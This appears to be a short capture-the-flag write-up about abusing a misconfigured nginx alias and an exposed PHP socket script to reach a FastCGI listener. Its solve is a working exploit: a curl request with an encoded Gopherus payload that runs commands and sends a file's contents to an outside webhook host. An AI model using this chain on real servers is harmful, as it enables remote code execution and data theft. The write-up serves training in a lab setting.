Misconfigured nginx alias <https://nhnc-when.whale-tw.com/file../>
There is socket-test-8cb09a.php~ which opens a socket and writes data to it.

In nginx.conf, you find the fastcgi listener:
```
    location ~ \.php$ {
        include fastcgi_params;
        fastcgi_pass vuln-tell-me-php:9000;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
```

Use <https://github.com/tarunkant/Gopherus> to generate payload to send to FastCGI listener and execute command. Exfil command output with curl.

Solve:
```
curl https://nhnc-when.whale-tw.com/socket-test-8cb09a.php?ip=vuln-tell-me-php&port=9000&data=AQEAAQAIAAAAAQAAAAAAAAEEAAEBAwMADxBTRVJWRVJfU09GVFdBUkVnbyAvIGZjZ2ljbGllbnQgCwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8IU0VSVkVSX1BST1RPQ09MSFRUUC8xLjEOA0NPTlRFTlRfTEVOR1RIMTU1DgRSRVFVRVNUX01FVEhPRFBPU1QJS1BIUF9WQUxVRWFsbG93X3VybF9pbmNsdWRlID0gT24KZGlzYWJsZV9mdW5jdGlvbnMgPSAKYXV0b19wcmVwZW5kX2ZpbGUgPSBwaHA6Ly9pbnB1dA8VU0NSSVBUX0ZJTEVOQU1FL2FwcC9wdWJsaWMvaW5kZXgucGhwDQFET0NVTUVOVF9ST09ULwAAAAEEAAEAAAAAAQUAAQCbBAA8P3BocCBzeXN0ZW0oJ2N1cmwgLVggUE9TVCAtZCAiJChjYXQgL2ZsYWdfeWVwX3VfZ2V0X3RoaXMpIiBodHRwczovL3dlYmhvb2suc2l0ZS8yZjJjMWE4NC1iMDA1LTRmZjMtYWRjNS0xOTg1NTQ0MWFmMzYnKTtkaWUoJy0tLS0tTWFkZS1ieS1TcHlEM3ItLS0tLQonKTs/PgAAAAA=
```

NHNC{old_school_"features"_lead_to_tragic}


Solved by: benkyou